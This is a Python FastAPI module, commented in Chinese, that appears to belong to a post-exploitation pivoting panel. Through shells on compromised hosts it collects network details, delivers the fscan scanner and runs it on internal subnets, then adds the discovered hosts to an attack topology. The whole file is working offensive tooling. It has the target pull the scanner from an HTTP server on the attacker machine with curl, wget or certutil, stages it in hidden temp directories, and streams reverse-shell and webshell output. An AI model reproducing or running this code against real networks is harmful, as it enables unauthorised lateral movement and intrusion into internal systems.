"""资产探测：① 内网信息收集 ② 上传扫描器扫内网 ③ 结果导入资产表 / 拓扑。

流程与手工打法一致：拿到 Shell 后先看网卡与 /etc/hosts 找出其他网段，
再上传 fscan 类扫描器扫内网，最后把发现的主机一键入库上拓扑。
"""

from __future__ import annotations

import base64
import re
import shlex
import threading
import time
import uuid

from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel
from sqlalchemy.orm import Session

from ..config import DEFAULT_PROJECT_ID, TOOLS_DIR
from ..db import get_db, get_session_factory, now
from ..models import Host, Shell
from ..schemas import HostOut
from ..schemas.common import rid
from ..service import add_event
from ..service.recon import (
    DEFAULT_PORTS, FSCAN_TEMPLATE, builtin_command, env_command, parse_arp, parse_hosts_file,
    parse_interfaces, parse_routes, parse_scan_output, parse_title_output, scanner_command,
    segments_of, split_sections, web_targets, web_title_command,
)
from ..ws import manager
from .deps import get_project
from .hosts import valid_ip
from .shells import _open_session  # 复用「反弹通道取回」逻辑，避免重复实现

router = APIRouter()

REMOTE_DIR_LINUX = "/tmp/.pivothub-recon"
REMOTE_DIR_WIN = r"C:\Windows\Temp\.pivothub-recon"

_SAFE_NAME = re.compile(r"[^0-9A-Za-z._-]+")
_WIN_ABS = re.compile(r"^[A-Za-z]:[\\/]")

LAYER_NEXT = {"LOCAL": "L1", "L1": "L2", "L2": "L3", "L3": "L3"}


def _check_remote_dir(override: str) -> str:
    """校验用户指定的目标暂存目录（靶机常不给 /tmp 或系统临时目录写权限）。"""
    d = str(override or "").strip().rstrip("\\/")
    if not d:
        return ""
    if any(c in d for c in "\0\n\r\t\"'`"):
        raise HTTPException(400, "目标暂存目录包含非法字符")
    if not (d.startswith("/") or _WIN_ABS.match(d)):
        raise HTTPException(400, r"目标暂存目录需为绝对路径，如 /var/tmp 或 C:\Users\Public")
    return d


def _remote_dir_for(sess, platform: str, override: str = "") -> str:
    """目标侧暂存目录：优先用户指定；否则 Linux 用 /tmp，Windows 问出真实 %TEMP%。"""
    if override:
        return override
    if platform != "windows":
        return REMOTE_DIR_LINUX
    res = sess.exec("echo %TEMP%", timeout=15)
    for line in reversed((res.output or "").splitlines()):
        line = line.strip().strip('"')
        if re.match(r"^[A-Za-z]:\\", line):
            return line.rstrip("\\/") + r"\.pivothub-recon"
    return REMOTE_DIR_WIN


def _scanner_payload(form) -> tuple[str, bytes | None]:
    """扫描器来源解析：tools/ 内置优先，其次浏览器上传的 base64。"""
    if form.localScanner:
        # tools/ 内置扫描器：服务端读取，避免浏览器把 8MB 二进制再传一遍
        src = (TOOLS_DIR / form.localScanner).resolve()
        if src.parent != TOOLS_DIR.resolve() or not src.is_file():
            raise HTTPException(404, f"本地扫描器不存在: {form.localScanner}")
        return src.name, src.read_bytes()
    if form.scannerB64:
        try:
            data = base64.b64decode(form.scannerB64)
        except Exception as e:
            raise HTTPException(400, f"扫描器 base64 解码失败: {e}")
        return _SAFE_NAME.sub("_", form.scannerName or "scanner"), data
    return "", None


def _remote_size(sess, platform: str, path: str) -> int | None:
    """远端文件字节数（不存在/读不到返回 None）。用于上传完整性校验与缓存判定。"""
    q = shlex.quote(path)
    cmd = (f'for %I in ("{path}") do @echo %~zI' if platform == "windows"
           else f"wc -c < {q} 2>/dev/null")
    out = sess.exec(cmd, timeout=25).output or ""
    for token in reversed(out.split()):
        if token.isdigit():
            return int(token)
    return None


#: auto 模式下走 HTTP 拉取的最小文件体积：小文件分片直传更快（省掉可达性预检与工具往返），
#: 大二进制（fscan ~8MB）才值得起一次 HTTP 拉取。
AUTO_HTTP_MIN_BYTES = 512 * 1024

#: HTTP 拉取单次尝试上限：没有超时参数的工具（certutil / Invoke-WebRequest / bitsadmin）
#: 在目标不通时会各自长挂，自动流程必须限次数 + 限时长。
PULL_MAX_TOOLS = 2
PULL_TIMEOUT = 90.0
PULL_PER_TIMEOUT = 45.0


def _pull_scanner(sess, platform: str, data: bytes, name: str, remote_path: str, log,
                  host: str = "") -> bool:
    """HTTP 拉取上传扫描器（与文件管理同一通道）：目标机用 curl/wget 自取 + 字节数校验。

    失败返回 False，由调用方回退分片直传（不静默、不伪造成功）。步骤：
    1) 暂存文件到攻击机临时 HTTP 服务（随机 token 路径）；
    2) **可达性预检**——目标连不上就直接放弃（否则下载工具会逐个长超时）；
    3) 探测目标可用下载工具，按 curl→wget→python→busybox 顺序尝试（限次数/时限）；
    4) 拉取后按目标侧真实字节数校验，条目立即撤下。
    """
    from ..service import filestage as stage_svc

    if not host:
        log("[http] 未配置攻击机地址，跳过 HTTP 拉取")
        return False
    item = None
    try:
        item = stage_svc.STAGE.add(name, data)
        port = stage_svc.STAGE.bound_port
        # 候选地址：项目攻击机 IP 优先，其次回环（同机联调 / 端口映射靶场）
        candidates = [h for h in dict.fromkeys([host, "127.0.0.1"]) if h]
        reachable = next((h for h in candidates if stage_svc.can_reach(sess, h, port)), "")
        if not reachable:
            log(f"[http] 目标机连不到攻击机 {host}:{port}（出站受限 / 网段不通），改走分片直传")
            return False
        if reachable != host:
            log(f"[http] 攻击机地址 {host} 不可达，回退用 {reachable} 拉取")
        url = f"http://{reachable}:{port}/s/{item.token}/{item.name}"
        tools = stage_svc.detect_tools(sess)
        if not tools:
            log("[http] 目标未检测到 curl/wget/python 等下载工具，改走分片直传")
            return False
        log(f"[http] 目标可用下载工具：{'/'.join(tools)} · {url}")
        res = stage_svc.pull_file(sess, url, remote_path, len(data), platform=platform,
                                  tools=tools, timeout=PULL_TIMEOUT,
                                  per_timeout=PULL_PER_TIMEOUT, max_tools=PULL_MAX_TOOLS)
        for line in res.log:
            log(f"[http] {line}")
        if res.ok:
            log(f"[http] {res.tool} 拉取通过：{res.size} 字节（HTTP 传输，不经会话分片）")
            return True
        log(f"[http] 拉取失败（{res.reason}）")
        return False
    except Exception as e:  # SessionError / OSError / 其他：如实记录并回退
        log(f"[http] HTTP 拉取异常：{e}")
        return False
    finally:
        # 拉取结果已定，立即撤下暂存条目（不留暴露面）
        if item is not None:
            stage_svc.STAGE.drop(item.token)


def _upload_scanner(sess, platform: str, data: bytes, scanner_name: str,
                    force: bool, remote_dir: str, log,
                    transfer: str = "auto", stage_host: str = "") -> tuple[str, bool]:
    """上传扫描器到目标暂存目录，并做**字节数校验**。

    传输方式（transfer）：
    - ``auto``（默认）：先走 HTTP 拉取（目标机 curl/wget 自取，与文件管理同通道），
      目标不通外网 / 无下载工具时自动回退分片直传；
    - ``http``：只走 HTTP 拉取，失败即如实报错；
    - ``chunk``：只走分片直传（旧行为）。

    只按「文件存在且非空」判定缓存会让截断的残file永远被复用（Go 二进制截断后
    必然 SIGBUS/Bus error）；这里缓存命中要求远端大小与本地一致，上传后必须校验。
    """
    name = _SAFE_NAME.sub("_", scanner_name or "scanner")
    remote_dir = _remote_dir_for(sess, platform, remote_dir)
    sep = "\\" if platform == "windows" else "/"
    scanner_path = remote_dir.rstrip("\\/") + sep + name
    remote_size = _remote_size(sess, platform, scanner_path)
    if remote_size == len(data) and not force:
        log(f"目标已存在 {scanner_path}（{remote_size} 字节，校验一致），跳过重复上传")
        return scanner_path, True
    if remote_size is not None and remote_size != len(data) and not force:
        log(f"目标同名文件大小不符（远端 {remote_size} / 本地 {len(data)} 字节），重新上传")
    mk = (f'mkdir "{remote_dir}"' if platform == "windows"
          else f"mkdir -p {shlex.quote(remote_dir)}")
    sess.exec(mk, timeout=20)

    if transfer in ("auto", "http"):
        use_http = True
        if transfer == "auto" and len(data) < AUTO_HTTP_MIN_BYTES:
            # 小文件分片直传更快：省掉可达性预检与下载工具往返（大二进制才值得 HTTP 拉取）
            use_http = False
            log(f"[http] 文件较小（{len(data)} 字节 < {AUTO_HTTP_MIN_BYTES}），直接分片直传；"
                "需要强制 HTTP 拉取请选 transfer=http")
        if use_http:
            if _pull_scanner(sess, platform, data, name, scanner_path, log, stage_host):
                after = _remote_size(sess, platform, scanner_path)
                if after == len(data):
                    if platform != "windows":
                        sess.exec(f"chmod +x {shlex.quote(scanner_path)}", timeout=20)
                    return scanner_path, False
                log(f"[http] 拉取后字节数不符（远端 {after} / 本地 {len(data)}），回退分片直传")
            elif transfer == "http":
                raise RuntimeError("HTTP 拉取失败（transfer=http 只走该通道）：请确认目标可回连"
                                   "攻击机，或改用 auto / chunk")

    size = sess.upload_file(scanner_path, data)
    after = _remote_size(sess, platform, scanner_path)
    if after != len(data):
        got = "读不到" if after is None else f"远端 {after} 字节"
        raise RuntimeError(f"扫描器上传校验失败：{got} ≠ 本地 {len(data)} 字节"
                           f"（网络中断 / 目标盘满？请重试或换暂存目录）")
    log(f"已上传扫描器 {size} 字节 → {scanner_path}（分片直传 · 校验一致）")
    if platform != "windows":
        sess.exec(f"chmod +x {shlex.quote(scanner_path)}", timeout=20)
    return scanner_path, False


def _get_shell(db: Session, shell_id: str) -> Shell:
    s = db.get(Shell, shell_id)
    if not s:
        raise HTTPException(404, f"Shell 不存在: {shell_id}")
    return s


def _seg_of(ip: str) -> str:
    return ".".join(ip.split(".")[:3]) + ".0/24"


class EnvIn(BaseModel):
    shellId: str


class ScanIn(BaseModel):
    projectId: str = ""
    shellId: str
    segment: str
    ports: str = DEFAULT_PORTS
    #: 本地 tools/ 内置扫描器文件名（如 fscan_linux；优先于 scannerB64）
    localScanner: str = ""
    #: 上传的扫描器（可选；为空则用内置轻量探测）
    scannerName: str = ""
    scannerB64: str = ""
    extraArgs: str = ""
    template: str = ""
    timeoutS: int = 300
    #: 目标上同名文件已存在时是否强制重新上传
    forceUpload: bool = False
    #: 扫描器传输方式：auto=HTTP 拉取优先+失败回退分片 / http=只走 HTTP 拉取 / chunk=只走分片直传
    transfer: str = "auto"
    #: 是否对 Web 端口补充抓取页面标题
    probeTitles: bool = True
    #: 目标侧暂存目录（留空 = 默认 /tmp 或 %TEMP%；靶机权限受限时指定可写目录）
    remoteDir: str = ""


class ImportIn(BaseModel):
    projectId: str = ""
    #: 发现来源主机（决定新网段的层级）
    fromHostId: str = ""
    hosts: list[dict] = []


@router.post("/recon/env")
def recon_env(form: EnvIn, db: Session = Depends(get_db)):
    """① 信息收集：网卡 / /etc/hosts / 路由 / ARP（真实执行，逐段解析）。"""
    s = _get_shell(db, form.shellId)
    try:
        sess = _open_session(db, s)
    except Exception as e:  # SessionError：会话不可用
        return {"ok": False, "error": f"会话不可用：{e}"}
    cmd = env_command(sess.platform)
    res = sess.exec(cmd, timeout=30)
    sections = split_sections(res.output)
    ifaces = parse_interfaces(sections.get("ipaddr", ""), sess.platform)
    hosts_file = parse_hosts_file(sections.get("hosts", ""))
    routes = parse_routes(sections.get("route", ""))
    arp = parse_arp(sections.get("arp", ""))
    known = {
        h.ip for h in db.query(Host).filter(Host.project_id == s.project_id).all()
    }
    return {
        "ok": res.ok,
        "error": res.error,
        "platform": sess.platform,
        "cmd": cmd,
        "ms": res.ms,
        "ifaces": ifaces,
        "hostsFile": hosts_file,
        "routes": routes,
        "arp": arp,
        "segments": segments_of(ifaces, routes),
        "knownIps": sorted(known),
        "raw": (res.output or "")[:8000],
    }


@router.get("/recon/scanners")
def recon_scanners():
    """本地 tools/ 里可直接使用的扫描器（面板负责上传到目标，浏览器不必回传二进制）。"""
    tools = []
    try:
        entries = sorted(TOOLS_DIR.iterdir())
    except OSError:
        entries = []
    for p in entries:
        if not p.is_file():
            continue
        low = p.name.lower()
        if "fscan" not in low:
            continue
        tools.append({
            "key": p.name,
            "label": p.name,
            "platform": "windows" if low.endswith(".exe") else "linux",
            "size": p.stat().st_size,
            "template": FSCAN_TEMPLATE if "fscan" in low else "",
        })
    return {"tools": tools, "dir": str(TOOLS_DIR)}


@router.post("/recon/scan")
def recon_scan(form: ScanIn, db: Session = Depends(get_db)):
    """② 扫描内网：上传扫描器（二进制安全，已存在则跳过）→ 执行 → 解析结果。"""
    s = _get_shell(db, form.shellId)
    if not form.segment.strip():
        raise HTTPException(400, "请先选择或填写目标网段")
    remote_dir = _check_remote_dir(form.remoteDir)
    scanner_name, data = _scanner_payload(form)
    try:
        sess = _open_session(db, s)
    except Exception as e:
        return {"ok": False, "stage": "session", "error": f"会话不可用：{e}", "log": []}

    platform = sess.platform
    timeout = max(10, min(int(form.timeoutS or 300), 600))
    log: list[str] = []
    scanner_path = ""
    cached = False

    if data is not None:
        if form.localScanner:
            log.append(f"使用本地扫描器 tools/{scanner_name}（{len(data)} 字节）")
        try:
            from ..service import filestage as stage_svc

            scanner_path, cached = _upload_scanner(
                sess, platform, data, scanner_name, form.forceUpload, remote_dir, log.append,
                transfer=form.transfer,
                stage_host=stage_svc.stage_host(db, s.project_id, s, sess))
        except Exception as e:
            return {"ok": False, "stage": "upload", "error": f"扫描器上传失败：{e}", "log": log}

    template = form.template
    if scanner_path and not template and "fscan" in scanner_name.lower():
        template = FSCAN_TEMPLATE
    if scanner_path:
        cmd = scanner_command(scanner_path, form.segment.strip(), form.ports,
                              form.extraArgs, template, platform)
        if platform == "windows":
            cmd = "chcp 65001 >nul & " + cmd  # 中文控制台切 UTF-8，避免输出乱码
    else:
        cmd = builtin_command(form.segment.strip(), form.ports, platform)
        if not cmd:
            return {"ok": False, "stage": "command", "log": log,
                    "error": "未上传扫描器，且内置探测只支持 Linux /24 及以内网段——"
                             "请上传 fscan 等扫描器二进制后再扫描"}

    res = sess.exec(cmd, timeout=timeout)
    hosts = parse_scan_output(res.output)

    # 补充 Web 标题：fscan 已抓到的直接用，其余 Web 端口由目标侧再发一次首页 GET
    title_cmd = ""
    if form.probeTitles and hosts:
        targets = web_targets(hosts)
        if targets:
            title_cmd = web_title_command(targets, platform, timeout=5)
            if title_cmd:
                tres = sess.exec(title_cmd, timeout=min(90, max(30, len(targets) * 3)))
                titles = parse_title_output(tres.output)
                for h in hosts:
                    for info in h.get("portInfo") or []:
                        t = titles.get(f"{h['ip']}:{info.get('port')}")
                        cur = info.get("title") or ""
                        # 扫描器标题可能被 webshell 字符集弄坏（? / �），用目标侧 base64 抓取覆盖
                        if t and (not cur or "?" in cur or "\ufffd" in cur):
                            info["title"] = t
                log.append(f"补充抓取 Web 标题 {len(titles)} 条")

    add_event(db, s.project_id, "host",
              f"资产探测：扫描 {form.segment.strip()} 发现 {len(hosts)} 台主机",
              host_id=s.host_id,
              detail=f"{'上传扫描器' if scanner_path else '内置轻量探测'} · "
                     f"耗时 {res.ms}ms · 目标 {form.segment.strip()}")
    db.commit()
    return {
        "ok": res.ok,
        "stage": "scan",
        "error": res.error,
        "cmd": cmd,
        "titleCmd": title_cmd,
        "output": (res.output or "")[:20000],
        "hosts": hosts,
        "ms": res.ms,
        "timedOut": res.timed_out,
        "log": log,
        "cached": cached,
        "scannerPath": scanner_path,
    }


# ---------------------------------------------------------------------------
# 流式扫描：长任务实时日志（WS 推送 + 轮询兜底）
#
# fscan 扫 B 段可能跑十几分钟，同步接口只能等命令结束才返回；这里把执行放后台线程，
# 输出逐行经 WS 推送：面板「实时日志」与反弹 Shell 交互终端同步可见，随时可取消。
# ---------------------------------------------------------------------------

class ScanJob:
    """进程内扫描任务：状态 + 环形日志（供 WS 推送与轮询兜底）。"""

    MAX_LINES = 4000

    def __init__(self, shell_id: str, project_id: str, segment: str) -> None:
        self.id = "job-" + uuid.uuid4().hex[:10]
        self.shell_id = shell_id
        self.project_id = project_id
        self.segment = segment
        self.status = "running"            # running | done | error | cancelled
        self.lines: list[dict] = []        # [{seq, kind, line}]（环形，仅保留最近 MAX_LINES 行）
        self.hosts: list[dict] = []
        self.output = ""
        self.error = ""
        self.cmd = ""
        self.scanner_path = ""
        self.cached = False
        self.ms = 0
        self.timed_out = False
        self.started = time.time()
        self.finished = 0.0
        self.seq = 0
        self.cancel = threading.Event()
        self.lock = threading.Lock()

    def add_line(self, line: str, kind: str = "out") -> dict:
        with self.lock:
            self.seq += 1
            rec = {"seq": self.seq, "kind": kind, "line": line}
            self.lines.append(rec)
            if len(self.lines) > self.MAX_LINES:
                del self.lines[: len(self.lines) - self.MAX_LINES]
            return rec

    def snapshot(self, with_lines: bool = True) -> dict:
        with self.lock:
            lines = list(self.lines)
            seq = self.seq
        out = {
            "jobId": self.id, "shellId": self.shell_id, "status": self.status,
            "error": self.error, "cmd": self.cmd, "scannerPath": self.scanner_path,
            "cached": self.cached, "ms": self.ms, "timedOut": self.timed_out,
            "segment": self.segment, "seq": seq,
            "elapsed": int((self.finished or time.time()) - self.started),
        }
        if self.status != "running":
            out["hosts"] = self.hosts
            out["output"] = self.output[:20000]
        if with_lines:
            out["lines"] = lines
        return out


SCAN_JOBS: dict[str, ScanJob] = {}
SCAN_JOBS_LOCK = threading.Lock()
SCAN_JOBS_KEEP = 20  # 进程内只保留最近 N 个任务，避免长跑后无限增长


def _push_scan_line(job: ScanJob, line: str, kind: str = "out") -> None:
    rec = job.add_line(line, kind)
    manager.push("recon.scan", jobId=job.id, shellId=job.shell_id, status=job.status,
                 kind=kind, line=line, seq=rec["seq"])
    # 镜像到该会话的交互终端：Shell 管理里选中这个会话就能实时看到扫描日志
    manager.push("shell.output", shellId=job.shell_id, kind=kind, line=line)


def _finish_job(job: ScanJob, status: str, error: str = "") -> None:
    job.status = status
    if error:
        job.error = error
    job.finished = time.time()
    snap = job.snapshot(with_lines=False)
    manager.push(
        "recon.scan",
        done=True,
        error=job.error,
        hosts=snap.get("hosts", []),
        output=snap.get("output", ""),
        cmd=snap["cmd"],
        scannerPath=snap["scannerPath"],
        cached=snap["cached"],
        ms=snap["ms"],
        timedOut=snap["timedOut"],
        elapsed=snap["elapsed"],
        **{"jobId": job.id, "shellId": job.shell_id, "status": status, "seq": snap["seq"]},
    )


def _run_scan_job(job: ScanJob, form: ScanIn) -> None:
    """后台线程：上传 → 流式执行 → 解析 → 推送结果（每步日志都进面板与终端）。"""
    db = get_session_factory()()
    try:
        s = db.get(Shell, job.shell_id)
        if not s:
            _finish_job(job, "error", f"Shell 不存在: {job.shell_id}")
            return
        try:
            sess = _open_session(db, s)
        except Exception as e:
            _finish_job(job, "error", f"会话不可用：{e}")
            return

        platform = sess.platform
        timeout = max(10, min(int(form.timeoutS or 300), 3600))
        _push_scan_line(job, f"目标平台 {platform} · 扫描 {form.segment.strip()} · "
                             f"超时 {timeout}s", "dim")

        try:
            scanner_name, data = _scanner_payload(form)
        except HTTPException as e:
            _finish_job(job, "error", str(e.detail))
            return

        if data is not None:
            if form.localScanner:
                _push_scan_line(job, f"使用本地扫描器 tools/{scanner_name}（{len(data)} 字节）", "dim")
            try:
                from ..service import filestage as stage_svc

                job.scanner_path, job.cached = _upload_scanner(
                    sess, platform, data, scanner_name, form.forceUpload,
                    _check_remote_dir(form.remoteDir),
                    lambda t: _push_scan_line(job, t, "dim"),
                    transfer=form.transfer,
                    stage_host=stage_svc.stage_host(db, s.project_id, s, sess))
            except HTTPException as e:
                _finish_job(job, "error", str(e.detail))
                return
            except Exception as e:
                _finish_job(job, "error", f"扫描器上传失败：{e}")
                return

        template = form.template
        if job.scanner_path and not template and "fscan" in scanner_name.lower():
            template = FSCAN_TEMPLATE
        if job.scanner_path:
            cmd = scanner_command(job.scanner_path, form.segment.strip(), form.ports,
                                  form.extraArgs, template, platform)
            if platform == "windows":
                cmd = "chcp 65001 >nul & " + cmd  # 中文控制台切 UTF-8，避免输出乱码
        else:
            cmd = builtin_command(form.segment.strip(), form.ports, platform)
            if not cmd:
                _finish_job(job, "error",
                            "未上传扫描器，且内置探测只支持 Linux /24 及以内网段——"
                            "请上传 fscan 等扫描器二进制后再扫描")
                return
        job.cmd = cmd
        _push_scan_line(job, "$ " + cmd, "in")

        res = sess.exec_stream(cmd, lambda line: _push_scan_line(job, line),
                               timeout=timeout, cancel=job.cancel)
        job.ms = res.ms
        job.timed_out = res.timed_out
        job.output = res.output or ""

        if job.cancel.is_set():
            _push_scan_line(job, "已取消（目标侧已发 Ctrl+C）", "warn")
            add_event(db, job.project_id, "host",
                      f"资产探测：取消扫描 {job.segment}", host_id=s.host_id)
            db.commit()
            _finish_job(job, "cancelled", "已取消")
            return

        hosts = parse_scan_output(res.output)

        # 补充 Web 标题：fscan 已抓到的直接用，其余 Web 端口由目标侧再发一次首页 GET
        if form.probeTitles and hosts:
            targets = web_targets(hosts)
            if targets:
                _push_scan_line(job, f"补充抓取 Web 标题（{len(targets)} 个目标）…", "dim")
                title_cmd = web_title_command(targets, platform, timeout=5)
                if title_cmd:
                    tres = sess.exec(title_cmd, timeout=min(90, max(30, len(targets) * 3)))
                    titles = parse_title_output(tres.output)
                    for h in hosts:
                        for info in h.get("portInfo") or []:
                            t = titles.get(f"{h['ip']}:{info.get('port')}")
                            cur = info.get("title") or ""
                            # 扫描器标题可能被 webshell 字符集弄坏（? / �），目标侧抓取覆盖
                            if t and (not cur or "?" in cur or "\ufffd" in cur):
                                info["title"] = t
                    _push_scan_line(job, f"补充抓取 Web 标题 {len(titles)} 条", "dim")

        job.hosts = hosts
        _push_scan_line(job, f"扫描结束：发现 {len(hosts)} 台主机 · 耗时 {res.ms}ms",
                        "ok" if res.ok else "warn")

        add_event(db, job.project_id, "host",
                  f"资产探测：扫描 {job.segment} 发现 {len(hosts)} 台主机",
                  host_id=s.host_id,
                  detail=f"{'上传扫描器' if job.scanner_path else '内置轻量探测'} · "
                         f"耗时 {res.ms}ms · 目标 {job.segment}")
        s.last_beat_at = now()
        db.commit()
        _finish_job(job, "done" if res.ok else "error", res.error)
    except Exception as e:  # 后台线程不能让异常静默吞掉任务状态
        _finish_job(job, "error", f"扫描任务异常：{e}")
    finally:
        db.close()


@router.post("/recon/scan/stream")
def recon_scan_stream(form: ScanIn, db: Session = Depends(get_db)):
    """② 扫描内网（流式）：立即返回 jobId，日志经 WS 实时推送。

    反弹 Shell 会话边收边推（面板「实时日志」+ 该会话的交互终端同步可见）；
    HTTP 马驱动受协议限制，日志在命令结束后一次性回放。
    """
    s = _get_shell(db, form.shellId)
    if not form.segment.strip():
        raise HTTPException(400, "请先选择或填写目标网段")
    _check_remote_dir(form.remoteDir)
    _scanner_payload(form)  # 参数预检：扫描器不存在 / base64 损坏直接 400
    job = ScanJob(s.id, s.project_id, form.segment.strip())

    with SCAN_JOBS_LOCK:
        SCAN_JOBS[job.id] = job
        if len(SCAN_JOBS) > SCAN_JOBS_KEEP:
            done = sorted((j for j in SCAN_JOBS.values() if j.status != "running"),
                          key=lambda j: j.started)
            for old in done[: len(SCAN_JOBS) - SCAN_JOBS_KEEP]:
                SCAN_JOBS.pop(old.id, None)
    threading.Thread(target=_run_scan_job, args=(job, form), daemon=True).start()
    return {"ok": True, "jobId": job.id, "shellId": job.shell_id, "status": job.status}


@router.get("/recon/scan/jobs/{job_id}")
def recon_scan_job(job_id: str):
    """任务快照（轮询兜底：WS 丢帧 / 刷新页面后补全状态与日志）。"""
    job = SCAN_JOBS.get(job_id)
    if not job:
        raise HTTPException(404, "扫描任务不存在（面板可能已重启）")
    return job.snapshot()


@router.post("/recon/scan/jobs/{job_id}/cancel")
def recon_scan_cancel(job_id: str):
    job = SCAN_JOBS.get(job_id)
    if not job:
        raise HTTPException(404, "扫描任务不存在")
    job.cancel.set()
    return {"ok": True, "jobId": job_id}


@router.post("/recon/import")
def recon_import(form: ImportIn, db: Session = Depends(get_db)):
    """③ 把扫描结果导入资产表（去重 / 自动分层，并广播到拓扑）。"""
    project = get_project(db, form.projectId or DEFAULT_PROJECT_ID)
    src = db.get(Host, form.fromHostId) if form.fromHostId else None
    known: dict[str, str] = {}
    for h in db.query(Host).filter(Host.project_id == project.id).all():
        if h.segment and h.segment not in known:
            known[h.segment] = h.layer
    fallback_layer = LAYER_NEXT.get((src.layer if src else "L1"), "L2")

    added, skipped, out = 0, 0, []
    seen: set[str] = set()
    for item in form.hosts:
        ip = str(item.get("ip") or "").strip()
        if not valid_ip(ip) or ip in seen:
            skipped += 1
            continue
        seen.add(ip)
        if db.query(Host).filter(Host.project_id == project.id, Host.ip == ip).first():
            skipped += 1
            continue
        seg = _seg_of(ip)
        ports = sorted({int(p) for p in (item.get("ports") or []) if str(p).isdigit()})
        note = str(item.get("note") or "").strip()
        h = Host(
            id=rid("h"), project_id=project.id, ip=ip,
            hostname=str(item.get("hostname") or ""), os="未知（待指纹识别）",
            layer=known.get(seg, fallback_layer), segment=seg, privilege="", owned=False,
            ports=ports, services=[],
            note=(f"由 {src.ip} 扫描发现" if src else "资产探测导入") + (f" · {note}" if note else ""),
            discovery="资产探测（经 Shell 扫描）",
            ifaces=[{"iface": "eth0", "ip": ip, "segment": seg}],
        )
        db.add(h)
        out.append(h)
        added += 1

    if added:
        add_event(db, project.id, "host",
                  f"资产探测导入 {added} 台主机",
                  host_id=src.id if src else None,
                  detail="来源：经 Shell 扫描（" + (src.ip if src else "-") + "）")
    db.commit()
    for h in out:
        manager.push("host.found", host=HostOut.of(h).model_dump())
    return {"added": added, "skipped": skipped, "ids": [h.id for h in out]}
